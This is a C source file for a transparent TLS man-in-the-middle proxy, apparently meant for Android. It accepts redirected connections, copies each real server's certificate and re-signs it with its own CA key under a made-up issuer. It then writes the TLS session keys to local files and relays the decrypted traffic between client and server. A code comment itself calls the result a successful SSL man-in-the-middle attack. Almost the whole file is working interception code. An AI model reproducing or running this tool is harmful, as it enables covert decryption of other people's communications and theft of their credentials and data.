#include <linux/types.h>
#include <linux/socket.h>
#include <arpa/inet.h>
#include <linux/param.h>
#include <linux/netfilter_ipv4.h>
#include <linux/string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <time.h>
#include <strings.h>
#include <linux/time.h>
 
#include <openssl/ssl.h>
#include <openssl/err.h>


#define PRINT_THREAD(format, args...) do { printf("%lu thread:%d, ", getcurtimestamp(), sum); printf(format, ##args); } while (0);
#define PRINTF(format, args...) do { printf(format, ##args); } while (0);

#define LISTEN_BACKLOG 80

#define CAROOT_FILE  "/system/xbin/sslca.pem"
#define PUBKEY_FILE  "/system/xbin/public.key"
#define PRIKEY_FILE  "/system/xbin/private.key"
#define KEYLOG_FILES "/system/xbin/sslkeys.txt"
#define KEYLOG_FILEC "/system/xbin/sslkeyc.txt"
#define IP_KEY_FILE  "/system/xbin/ip_key.dat"
/* 
#define warning(msg) \
    do { fprintf(stderr, "%d, ", sum); perror(msg); } while(0)

#define error(msg) \
    do { fprintf(stderr, "%d, ", sum); perror(msg); exit(EXIT_FAILURE); } while (0)
*/

//注意上面sum没有继承 
#define warning PRINTF
#define error PRINTF
 
int sum = 1;
X509* root_x509 = NULL;
char gSuite[1024];

#define S2MS(s) ((s) * 1000)
#define MS2S(ms) ((ms) / 1000)
#define US2MS(us) ((us) / 1000)

unsigned long getcurtimestamp(void)
{
    struct timeval timeVal;
    time_t curTs;

    if (gettimeofday(&timeVal, NULL) != 0) {
        return 0;
    }

    curTs = (S2MS(timeVal.tv_sec)) + (US2MS(timeVal.tv_usec));
    return (unsigned long)curTs;
}

/* 面向客户端创建监听端口 */
int socket_to_client_init(short int port) {
    int sockfd;
    int on = 1;
    struct sockaddr_in addr;
 
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        error("Fail to initial socket to client!");

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *) &on, sizeof(on)) < 0)
        error("reuseaddr error!");
 
    memset(&addr, 0, sizeof(addr));
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*) &addr, sizeof(struct sockaddr)) < 0) {
        shutdown(sockfd, SHUT_RDWR);
        error("Fail to bind socket to client!");
    }
    if (listen(sockfd, LISTEN_BACKLOG) < 0) {
        shutdown(sockfd, SHUT_RDWR);
        error("Fail to listen socket to client!");
    }
 
    return sockfd;
}


/* 向目的源站服务器发起socket连接 */
int get_socket_to_server(struct sockaddr_in* original_server_addr) {
    int sockfd;
 
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        error("Fail to initial socket to server!");
    
    if (connect(sockfd, (struct sockaddr*) original_server_addr,
            sizeof(struct sockaddr)) < 0)
        error("Fail to connect to server!");
 
    PRINTF("%lu thread:%d, Connect to server [%s:%d]\n", getcurtimestamp(), sum,
            inet_ntoa(original_server_addr->sin_addr),
            ntohs(original_server_addr->sin_port));
    return sockfd;
}
 
/* 接受客户端发送建联socket连接 */
int get_socket_to_client(int socket, struct sockaddr_in* original_server_addr) {
    int client_fd;
    struct sockaddr_in client_addr;
    socklen_t client_size = sizeof(struct sockaddr);
    socklen_t server_size = sizeof(struct sockaddr);
 
    memset(&client_addr, 0, client_size);
    memset(original_server_addr, 0, server_size);
    client_fd = accept(socket, (struct sockaddr *) &client_addr, &client_size);
    if (client_fd < 0) {
        warning("Fail to accept socket to client!");
        return -1;
    }
    if (getsockopt(client_fd, SOL_IP, SO_ORIGINAL_DST, original_server_addr,
            &server_size) < 0) {
        warning("Fail to get original server address of socket to client!");;
    }
    PRINTF("%lu thread:%d, New SSL connection from client [%s:%d] to server [%s:%d]\n", getcurtimestamp(), sum,
            inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port),
            inet_ntoa(original_server_addr->sin_addr),
            ntohs(original_server_addr->sin_port));

 
    return client_fd;
}

/* 读取CA根证书文件，用于获取ski至子证书aki */
X509 *get_root_cert(void) 
{
    BIO *bio;
    X509 *x509;

    if ((bio = BIO_new(BIO_s_file())) == NULL) {
       PRINTF("x509 bio fail\n");
       return 0;
    }
    if (BIO_read_filename(bio, CAROOT_FILE) <= 0) {
        PRINTF("x509 bio fail:%s\n", CAROOT_FILE);
        BIO_free(bio);
        return 0;
    }
    
    while ((x509 = PEM_read_bio_X509(bio, NULL, NULL, NULL)) != NULL) {
        return x509;
    }
    return 0;
} 

/* 设置CA根证书至证书链 */
int set_root_cert_chain(SSL_CTX *ctx) 
{
    BIO *bio;
    X509 *x509;
    int n;

    if ((bio = BIO_new(BIO_s_file())) == NULL) {
       PRINTF("x509 bio fail\n");
       return 0;
    }
    if (BIO_read_filename(bio, CAROOT_FILE) <= 0) {
        PRINTF("x509 bio fail:%s\n", CAROOT_FILE);
        BIO_free(bio);
        return 0;
    }
    
    n = 0;
    while ((x509 = PEM_read_bio_X509(bio, NULL, NULL, NULL)) != NULL) {
        if (!SSL_CTX_add_extra_chain_cert(ctx, x509)) {
            X509_free(x509);
            BIO_free(bio);
            return 0;
        }
        n++;
    }
    return 1;
} 

/* 载入SSL库 */
void SSL_init() {
    SSL_library_init();
    SSL_load_error_strings();
}
 
void SSL_Warning(char *custom_string) {
    char error_buffer[256] = { 0 };
 
    PRINTF("%lu thread:%d, %s ", getcurtimestamp(), sum, custom_string);
    ERR_error_string(ERR_get_error(), error_buffer);
    PRINTF("%s\n", error_buffer);
}
 
void SSL_Error(char *custom_string) {
    SSL_Warning(custom_string);
    exit(EXIT_FAILURE);
}

void write_file(int fd, const char *line) {
    char *Enter = "\r\n";
    write(fd, line, strlen(line));
    write(fd, Enter, strlen(Enter));
    close(fd);
}

int create_file(const char *path) {
    int fd;
    fd = open(path, O_APPEND|O_CREAT|O_RDWR);
    return fd;
}

static void client_keylog_callback(const SSL *ssl, const char *line) {
		int fd = create_file(KEYLOG_FILES); //暂时都写入服务器的文件内
		if (fd > 0) {
			 write_file(fd, line);
		}
		
		PRINTF("C KEYLOG: %s\n", line);
}


static void server_keylog_callback(const SSL *ssl, const char *line) {
		int fd = create_file(KEYLOG_FILES);
		if (fd > 0) {
			 write_file(fd, line);
		}
		PRINTF("S KEYLOG: %s\n", line);
}

/* 向目的源服务器建立SSL连接 */ 
SSL* SSL_to_server_init(int socket) {
    SSL_CTX *ctx;
 
    ctx = SSL_CTX_new(SSLv23_client_method());
    if (ctx == NULL)
        SSL_Error("Fail to init ssl ctx!");
 
    SSL *ssl = SSL_new(ctx);
    if (ssl == NULL)
        SSL_Error("Create ssl error");
    if (SSL_set_fd(ssl, socket) != 1)
        SSL_Error("Set fd error");
		SSL_CTX_set_keylog_callback(ctx, server_keylog_callback);
 
    return ssl;
}
 
/* 向客户端建立SSL连接，主要为准备子证书文件和私钥 */ 
SSL* SSL_to_client_init(int socket, X509 *cert, EVP_PKEY *key) {
    SSL_CTX *ctx;
 
    ctx = SSL_CTX_new(SSLv23_server_method());
    if (ctx == NULL)
        SSL_Error("Fail to init ssl ctx!");
    if (cert && key) {
        if (SSL_CTX_use_certificate(ctx, cert) != 1)
            SSL_Error("Certificate error");

        if (set_root_cert_chain(ctx) != 1)
            SSL_Error("Certificate chain error");

        if (SSL_CTX_use_PrivateKey(ctx, key) != 1)
            SSL_Error("key error");

        if (SSL_CTX_check_private_key(ctx) != 1)
            SSL_Error("Private key does not match the certificate public key");
    }

    SSL_CTX_set_cipher_list(ctx, gSuite);
 
    SSL *ssl = SSL_new(ctx);
    if (ssl == NULL)
        SSL_Error("Create ssl error");
    if (SSL_set_fd(ssl, socket) != 1)
        SSL_Error("Set fd error");
		SSL_CTX_set_keylog_callback(ctx, client_keylog_callback); 
 
    return ssl;
}

/* 关闭SSL连接 */  
void SSL_terminal(SSL *ssl) {
    SSL_CTX *ctx = SSL_get_SSL_CTX(ssl);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    if (ctx)
        SSL_CTX_free(ctx);
}


/* 读取证书的私钥和公钥信息（子证书和根证书公用），其实也用于root根证书签名私钥 */ 
EVP_PKEY* create_key() {
    EVP_PKEY *key = EVP_PKEY_new();
    RSA *rsa = RSA_new();
    FILE *fp;

    if ((fp = fopen(PRIKEY_FILE, "r")) == NULL)
        error(PRIKEY_FILE);
    PEM_read_RSAPrivateKey(fp, &rsa, NULL, NULL);
    
    if ((fp = fopen(PUBKEY_FILE, "r")) == NULL)
        error(PUBKEY_FILE);
    PEM_read_RSAPublicKey(fp, &rsa, NULL, NULL);
 
    EVP_PKEY_assign_RSA(key,rsa);
    return key;
}

/* 伪造子证书，从服务器获取子证书作为模板，排除部分信息，并用根证书私钥签名 */ 
X509* create_fake_certificate(SSL* ssl_to_server, EVP_PKEY *key) {
    //unsigned char buffer[128] = { 0 };
    int location;
    int NID; 
    unsigned char *leaf_aki = NULL;
    unsigned char *leaf_ski = NULL;
    unsigned char *root_ski = NULL;
    int root_ski_len, root_aki_len;
    X509_EXTENSION *ex;
    X509 *server_x509 = SSL_get_peer_certificate(ssl_to_server);
    X509 *fake_x509 = X509_dup(server_x509);

    if (server_x509 == NULL)
        SSL_Error("Fail to get the certificate from server!");
 
    X509_set_version(fake_x509, X509_get_version(server_x509));

    // huangtest begin
    /* 从根证书获取ski */
    if (root_x509 != NULL) {
        for (location = X509_get_ext_count(root_x509) - 1; location >= 0; location--)
        {
            ex = X509_get_ext(root_x509, location);
            NID = OBJ_obj2nid(X509_EXTENSION_get_object(ex));
            if (NID == NID_subject_key_identifier) {
                root_ski = (unsigned char *)(X509_EXTENSION_get_data(ex)->data);
                root_ski_len = X509_EXTENSION_get_data(ex)->length;

//                root_ski = (unsigned char *)ex->value->data;
//                root_ski_len = ex->value->length;
            }
        }
    }

    for (location = X509_get_ext_count(fake_x509) - 1; location >= 0; location--)
    {
        ex = X509_get_ext(fake_x509, location);
        NID = OBJ_obj2nid(X509_EXTENSION_get_object(ex));
#if 0
        /* 获取子证书的ski，实际不改这个信息 */
        if (NID == NID_subject_key_identifier) {
            leaf_ski = (unsigned char *)ex->value->data;
            PRINTF("ski length:%d, string:%08x%08x%08x%08x%08x%04x\n", ex->value->length
                        , ntohl(*(unsigned int *)leaf_ski)
                        , ntohl(*(unsigned int *)(leaf_ski+4))
                        , ntohl(*(unsigned int *)(leaf_ski+8))
                        , ntohl(*(unsigned int *)(leaf_ski+12))
                        , ntohl(*(unsigned int *)(leaf_ski+16))
                        , ntohs(*(unsigned short *)(leaf_ski+20)));
        }
#endif
        /* 获取子证书aki信息，用于替换新根证书的ski信息 */
        if ((NID == NID_authority_key_identifier) && (root_ski != NULL)) {
            leaf_aki = (unsigned char *)(X509_EXTENSION_get_data(ex)->data);
            root_aki_len = X509_EXTENSION_get_data(ex)->length;

           // leaf_aki = (unsigned char *)ex->value->data;
           // root_aki_len = ex->value->length;
#if 0
            PRINTF("aki length:%d, string:%08x%08x%08x%08x%08x%04x\n", ex->value->length
                        , ntohl(*(unsigned int *)leaf_aki)
                        , ntohl(*(unsigned int *)(leaf_aki+4))
                        , ntohl(*(unsigned int *)(leaf_aki+8))
                        , ntohl(*(unsigned int *)(leaf_aki+12))
                        , ntohl(*(unsigned int *)(leaf_aki+16))
                        , ntohs(*(unsigned short *)(leaf_aki+20)));
#endif
            /* 格式不太好，用魔鬼数字来确定可替换信息 */
            if ((root_aki_len == 24) && (root_ski_len == 22)) {
                memcpy(leaf_aki + 4, root_ski + 2, 20);
            } else {
                PRINTF("replace aki failure. length(aki,ski):%d, %d\n", root_aki_len, root_ski_len);
            }
        }

        /* 保留的扩展信息 */
        if ((NID == NID_key_usage)             //继承
            || (NID == NID_basic_constraints)  //继承
            || (NID == NID_subject_alt_name)   //继承
            || (NID == NID_ext_key_usage)      //继承
            || (NID == NID_authority_key_identifier) //需要修改
            || (NID == NID_subject_key_identifier)   //保留，实际应该是子证书的公钥散列，协议要求随机不重复即可
            || (NID == NID_ct_precert_scts))  //不知道是否需要保留
            continue;
        //X509_delete_ext(fake_x509, location);     全部保留暂时测试
    }
    // huangtest end

    /* 修改序列号 */    
    ASN1_INTEGER *a = X509_get_serialNumber(fake_x509);
    a->data[0] = a->data[0] + 1;
    //    ASN1_INTEGER_set(X509_get_serialNumber(fake_x509), 4);

    /* 重写CA发行者信息，实际最好从证书里面读取，这里写死说明必须和根证书一一绑定 */
    X509_NAME *issuer = X509_NAME_new();
//    length = X509_NAME_get_text_by_NID(issuer, NID_organizationalUnitName, buffer, 128);
//    buffer[length] = ' ';
//    loc = X509_NAME_get_index_by_NID(issuer, NID_organizationalUnitName, -1);
//    X509_NAME_delete_entry(issuer, loc);

    X509_NAME_add_entry_by_txt(issuer, "C", MBSTRING_ASC, (const unsigned char *)"CN", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "ST", MBSTRING_ASC, (const unsigned char *)"Guangdong", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "L", MBSTRING_ASC, (const unsigned char *)"Shenzhen", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "O",  MBSTRING_ASC, (const unsigned char *)"AAAAAAAA CA", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "OU", MBSTRING_ASC, (const unsigned char *)"AAAAAAAA CA", -1, -1, 0);
    X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC, (const unsigned char *)"AAAA", -1, -1, 0);

    
//    X509_NAME_add_entry_by_txt(issuer, "C", MBSTRING_ASC, "CN", -1, -1, 0);
//    X509_NAME_add_entry_by_txt(issuer, "ST", MBSTRING_ASC, "Some", -1, -1, 0);
//    X509_NAME_add_entry_by_txt(issuer, "L", MBSTRING_ASC, "Shenzhen", -1, -1, 0);
//    X509_NAME_add_entry_by_txt(issuer, "O",  MBSTRING_ASC, "ASGC_CA", -1, -1, 0);
//    X509_NAME_add_entry_by_txt(issuer, "OU", MBSTRING_ASC, "ASGC_CA", -1, -1, 0);
//    X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC, "ASGC_CA", -1, -1, 0);
//    X509_NAME_add_entry_by_txt(issuer, "CN", MBSTRING_ASC, (unsigned char *)"QUIC Server Root CA", -1, -1, 0);
    X509_set_issuer_name(fake_x509, issuer);
        
//    X509_set_notBefore(fake_x509, X509_get_notBefore(server_x509));
//    X509_set_notAfter(fake_x509, X509_get_notAfter(server_x509));
//    X509_set_subject_name(fake_x509, X509_get_subject_name(server_x509));

    /* 重要写入公钥 */    
    X509_set_pubkey(fake_x509, key);
//    X509_add_ext(fake_x509, X509_get_ext(server_x509, -1), -1);
    /* 用CA私钥签名，实际应该区分公钥是子证书公钥，私钥是根证书私钥，但proxy简单来说可以用一个 */
    X509_sign(fake_x509, key, EVP_sha256());
 
//    X509_print_fp(stderr, fake_x509);
 
    return fake_x509;
}

void print_connectinfo(int socket_to_client, int socket_to_server) {

    char buffer[1024] = { 0 }; 
    struct sockaddr_in localaddr,peeraddr;
    socklen_t len = sizeof(struct sockaddr_in);

    bzero(&localaddr, sizeof(localaddr));
    getsockname(socket_to_server, (struct sockaddr*)&localaddr, &len);
    printf("%lu thread:%d, toServer[%s:%d]", getcurtimestamp(), sum,
        inet_ntop(AF_INET, &localaddr.sin_addr, buffer, sizeof(buffer)), ntohs(localaddr.sin_port));

    bzero(&peeraddr, sizeof(peeraddr));
    getpeername(socket_to_server, (struct sockaddr*)&peeraddr, &len);
    printf("[%s:%d]\n", inet_ntop(AF_INET, &peeraddr.sin_addr, buffer, sizeof(buffer)), ntohs(peeraddr.sin_port));

    bzero(&localaddr,sizeof(localaddr));
    getsockname(socket_to_client,(struct sockaddr*)&localaddr,&len);
    printf("%lu thread:%d, toClient[%s:%d]", getcurtimestamp(), sum,
      inet_ntop(AF_INET,&localaddr.sin_addr,buffer,sizeof(buffer)), ntohs(localaddr.sin_port)); 
    
    bzero(&peeraddr,sizeof(peeraddr));
    getpeername(socket_to_client,(struct sockaddr*)&peeraddr,&len);
    printf("[%s:%d]\n",inet_ntop(AF_INET,&peeraddr.sin_addr,buffer,sizeof(buffer)), ntohs(peeraddr.sin_port)); 
}


void write_connectinfo(int socket_to_client, int socket_to_server) {
    char buffer[1024] = { 0 };
    char *c, *s;
    struct sockaddr_in client_addr, server_addr;
    socklen_t len = sizeof(struct sockaddr_in);
    int ip127 = ntohl(0x7F000001);
    int ip10 = ntohl(0x0a0a0a0a);
    short port8888 = ntohs(8888);
    short port443 = ntohs(443);

    bzero(&client_addr, sizeof(client_addr));
    getpeername(socket_to_client, (struct sockaddr*)&client_addr, &len);
    //printf("%lu thread : %d, client[%s:%d]\n", getcurtimestamp(), sum, 
    //    inet_ntop(AF_INET, &client_addr.sin_addr, buffer, sizeof(buffer)), ntohs(client_addr.sin_port));

    bzero(&server_addr, sizeof(server_addr));
    getpeername(socket_to_server, (struct sockaddr*)&server_addr, &len);
    //printf("%lu thread : %d, server[%s:%d]\n", getcurtimestamp(), sum, 
    //    inet_ntop(AF_INET, &server_addr.sin_addr, buffer, sizeof(buffer)), ntohs(server_addr.sin_port));

    c = (char*)&client_addr;
    s = (char*)&server_addr;
    int fd = create_file(IP_KEY_FILE);
    write(fd, c + 4, 4);  write(fd, &ip127, sizeof(int));  write(fd, c + 2, 2);  write(fd, &port8888, sizeof(short));
    write(fd, c + 4, 4);  write(fd, &ip10, sizeof(int));   write(fd, c + 2, 2);  write(fd, &port443, sizeof(short));

    write(fd, s + 4, 4);             write(fd, c + 4, 4);  write(fd, &port443, sizeof(short));  write(fd, c + 2, 2);
    write(fd, &ip10, sizeof(int));   write(fd, c + 4, 4);  write(fd, &port443, sizeof(short));  write(fd, c + 2, 2);
    close(fd);
}

/* 处理客户端和服务器之间消息传递，直到连接关闭或异常 */ 
int transfer(SSL *ssl_to_client, SSL *ssl_to_server) {
    int c_out = 0;
    int c_bytes = 0;
    int s_out = 0;
    int s_bytes = 0;
    int socket_to_client = SSL_get_fd(ssl_to_client);
    int socket_to_server = SSL_get_fd(ssl_to_server);
    int ret;
    char buffer[128 * 1024] = { 0 }; // 这里缓冲不够，可能导致SSL_read读不完整
    int maxloop = 0;
    int maxloop2 = 0;
    int maxloop3 = 0;
    bool firstread = true;
 
    fd_set fd_read;
 
    PRINTF("%lu thread:%d, SSL Builded. Waiting for transfer\n", getcurtimestamp(), sum);
    print_connectinfo(socket_to_client, socket_to_server);
    write_connectinfo(socket_to_client, socket_to_server);
    while (1) {
        int max;
        struct timeval timeout;
        bool isRead = false;
 
        FD_ZERO(&fd_read);
        FD_SET(socket_to_server, &fd_read);
        FD_SET(socket_to_client, &fd_read);
        max = socket_to_client > socket_to_server ? socket_to_client + 1
                : socket_to_server + 1;
        if (firstread) {
          timeout.tv_sec =0;
          timeout.tv_usec=5;
        } else {
          timeout.tv_sec =3;
          timeout.tv_usec=0;
        }
        //PRINTF("%lu thread: %d, select begin\n", getcurtimestamp(), sum);
        ret = select(max, &fd_read, NULL, NULL, &timeout);
//        ret = select(max, &fd_read, NULL, NULL, NULL);
        if (ret < 0) {
//            if (errno == EINTR) {
//                continue;
//            }
            PRINTF("Fail to select(%d) errno: %s!\n", ret, "strerror(errno)\n");
            //SSL_Warning("Fail to select!");
            break;
        } else if (ret == 0) {
            maxloop++;
            if (maxloop > 10) {
              maxloop = 0;
              PRINTF("%lu thread: %d, *****maxloop ret = 0\n", getcurtimestamp(), sum);
              break; //长期没数据，退出，尝试性 20211029
            }
            //continue;
        }        
        /* 从客户端收发送到服务器 */
        if (FD_ISSET(socket_to_client, &fd_read) || firstread) {
            isRead = true;
            memset(buffer, 0, sizeof(buffer));
            ret = SSL_read(ssl_to_client, buffer, sizeof(buffer));
            if (ret > 127 * 1024)
                    PRINTF("%lu thread:%d, ****Big data from client recv:%d\n", getcurtimestamp(), sum, ret);
            if (ret > 0) {
                //if (firstread)
                //    write_connectinfo(socket_to_client, socket_to_server);

                firstread = false;
                c_out++; c_bytes += ret;
                if (ret != SSL_write(ssl_to_server, buffer, ret)) {
                    SSL_Warning("Fail to write to server!\n");
                    break;
                } else {
                    PRINTF("%lu thread:%d, client send %d bytes to server\n", getcurtimestamp(), sum, ret);
                    if (  ((buffer[0] == 'G') && (buffer[1] == 'E')) 
                        ||((buffer[0] == 'P') && (buffer[1] == 'O')) 
                        ||((buffer[0] == 'H') && (buffer[1] == 'T')))
                        ;
                        //PRINTF("%s\n", buffer);
                }
            } else if (ret < 0){ // 不清楚ret = 0 是否算异常，这里暂时不错出错处理
                SSL_Warning("Fail to read from client!");
                PRINTF("ret:%d, %d\n", ret, SSL_get_error(ssl_to_client, ret));
                break;
            } else {
              maxloop2++;
              if (maxloop2 > 10000) {
                  maxloop2 = 0;
                  PRINTF("%lu thread:%d, read client length = %d\n", getcurtimestamp(), sum, ret);
                  break;
              }
            }
        }

        /* 从服务器发送到客户端 */
        if (FD_ISSET(socket_to_server, &fd_read) || firstread) {
            isRead = true;
            memset(buffer, 0, sizeof(buffer));
            ret = SSL_read(ssl_to_server, buffer, sizeof(buffer));
            if (ret > 0) {
                //if (firstread)
                //    write_connectinfo(socket_to_client, socket_to_server);

                firstread = false;
                s_out++; s_bytes += ret;
                if (ret > 127 * 1024)
                    PRINTF("%lu thread:%d, ****Big data from server recv:%d\n", getcurtimestamp(), sum, ret);
                if (ret != SSL_write(ssl_to_client, buffer, ret)) {
                    SSL_Warning("Fail to write to client!\n");
                    break;
                } else {
                    PRINTF("%lu thread:%d, server send %d bytes to client\n", getcurtimestamp(), sum, ret);
                    if (  ((buffer[0] == 'G') && (buffer[1] == 'E')) 
                        ||((buffer[0] == 'P') && (buffer[1] == 'O')) 
                        ||((buffer[0] == 'H') && (buffer[1] == 'T')))
                        ;
                        //PRINTF("%s\n", buffer);
                }
            } else if (ret < 0){ // 不清楚ret = 0 是否算异常，这里暂时不错出错处理
                SSL_Warning("Fail to read from server!\n");
                PRINTF("ret:%d, %d\n", ret, SSL_get_error(ssl_to_server, ret));
                break;
            } else {
              maxloop3++;
              if (maxloop3 > 10000) {
                  maxloop3 = 0;
                  PRINTF("%lu thread:%d, read server length = %d\n", getcurtimestamp(), sum, ret);
                  break;
              }
            }
        }
        
        if (!isRead) {
            PRINTF("%lu thread:%d, select ret:%d firstread:%d\n", getcurtimestamp(), sum, ret, firstread);
        }
    }

    PRINTF("%lu thread:%d, c(%d,%d), s(%d,%d)\n", getcurtimestamp(), sum, c_out, c_bytes, s_out, s_bytes);
    return -1;
}


char *get_server_name(char *buff, int len) {
    char *p   = NULL;
    char *ret = NULL;
    int type;
    int length = 0;
    int loop = 0;

//    PRINTF("0 :%08x,%d\n", buff, length);
    p = buff;
    if (*p++ != 0x16)  //content type shakehand
        return NULL;

    p += 4;            //skip version + length
    if (*p++ != 0x1)   //shake hand type clienthello
        return 0;
    
    p += (3 + 2 + 32);          //skip length + version + Random
    length = *p++; p += length; //skip SessionId
    length = ntohs(*(unsigned short *)p); p += (2 + length); //skip Cipher Suites
    length = *p++; p += length; //skip Compression Methods

    p += 2;            //skip Extensions length
    while (loop++ < 16) {
        type = ntohs(*(unsigned short *)p); p += 2;   //skip Entension type
        length = ntohs(*(unsigned short *)p); p += 2; //skip Entension length
        
        if (type == 0)     // Enten type is server_name
        {
            p += 2;        // skip server_name list length
            if (*p++ != 0) // server_name type is hostname
                return NULL;
            
            length = ntohs(*(unsigned short *)p); p += 2; //skip server_name length
            ret = p;

            p += length; *p = 0; // fillin end \0
            return ret;
        }
        p += length; // skip Eetension content
    }
    
    PRINTF("not find server-name :%08x,%d\n", (int)p, length);
    return NULL;
}

 
int main(int argc, char* argv[]) {
    pid_t forkid = 1;
    PRINT_THREAD("\n Program version:%s %s.\n Openssl-version:%s\n argv_num:%d\n", __DATE__, __TIME__, OpenSSL_version(OPENSSL_VERSION), argc);
    for (int i = 0; i < argc; i++)
        PRINT_THREAD("Argv[%d]:%s\n", i, argv[i]);
    memset(gSuite, 0, sizeof(gSuite));

    if (argc >= 2) {
	    strcpy(gSuite, argv[1]);
    } else {
	    strcpy(gSuite, "ALL");
    }
    PRINT_THREAD("gSuite:%s\n", gSuite);
    // 初始化一个socket，将该socket绑定到8888端口，并监听
    int socket = socket_to_client_init(8888);
    // 从文件读取伪造SSL证书时需要的RAS私钥和公钥
    EVP_PKEY* key = create_key();
    //X509* root_x509 = NULL;
    // 初始化openssl库
    SSL_init();
    root_x509 = get_root_cert();
    
    while (1) {
        struct sockaddr_in original_server_addr;
        // 从监听的端口获得一个客户端的连接，并将该连接的原始目的地址存储到original_server_addr中
        int socket_to_client = get_socket_to_client(socket, &original_server_addr);
        if (socket_to_client < 0)
            continue;

//        if (forkid)
        forkid = fork();
        
        // 新建一个子进程处理后续事宜，主进程继续监听端口等待后续连接
        if (!forkid) {
            X509 *fake_x509;
            SSL *ssl_to_client, *ssl_to_server;
            char buff[2048];
            char *p = NULL;
            int length;

            //尝试获取 ClientHello 消息头的 ServerName
            length = recv(socket_to_client, buff, 2048, MSG_PEEK);
            if (length > 0) 
                p = get_server_name(buff, length);

            // 通过获得的原始目的地址，连接真正的服务器，获得一个和服务器连接的socket
            int socket_to_server = get_socket_to_server(&original_server_addr);
            // 通过和服务器连接的socket建立一个和服务器的SSL连接
            ssl_to_server = SSL_to_server_init(socket_to_server);

            if (p != NULL) {
                char data[10];
                PRINTF("%lu thread:%d, set sname: %s\n", getcurtimestamp(), sum, p);
                SSL_set_tlsext_host_name(ssl_to_server, p); //设置请求服务器的名称，防止同一IP地址有多个服务器
                memcpy(data, "\x08http/1.1", 9);           
                SSL_set_alpn_protos(ssl_to_server, (unsigned char *)data, 9);  //设置ALPN请求参数
            } else {
                PRINTF("%lu thread:%d, set sname len:%d, none\n", getcurtimestamp(), sum, length);
            }
            
            if (SSL_connect(ssl_to_server) < 0) {
                PRINTF("%lu thread:%d, Fail to connect server with ssl!\n", getcurtimestamp(), sum);
                exit(1);
            }
            PRINTF("%lu thread:%d, SSL to server\n", getcurtimestamp(), sum);
 
            // 从服务器获得证书，并通过这个证书伪造一个假的证书
            fake_x509 = create_fake_certificate(ssl_to_server, key);
            // 使用假的证书和我们自己的密钥，和客户端建立一个SSL连接。至此，SSL中间人攻击成功
            ssl_to_client = SSL_to_client_init(socket_to_client, fake_x509, key);
            if (SSL_accept(ssl_to_client) <= 0) {
                PRINTF("%lu thread:%d, Fail to accept client with ssl!\n",getcurtimestamp(), sum);
                exit(1);
            }
            PRINTF("%lu thread:%d, SSL to client\n", getcurtimestamp(), sum);
 
            // 在服务器SSL连接和客户端SSL连接之间转移数据，并输出服务器和客户端之间通信的数据
            if (transfer(ssl_to_client, ssl_to_server) < 0) {
                PRINTF("%lu thread:%d, ssl connection shutdown\n", getcurtimestamp(), sum);
                SSL_terminal(ssl_to_client);
                SSL_terminal(ssl_to_server);
                shutdown(socket_to_server, SHUT_RDWR);
                shutdown(socket_to_client, SHUT_RDWR);
                X509_free(fake_x509);
            }
            exit(0);
        } else {
            ++sum;
        }
    }
 
    EVP_PKEY_free(key);
    return 0;
}
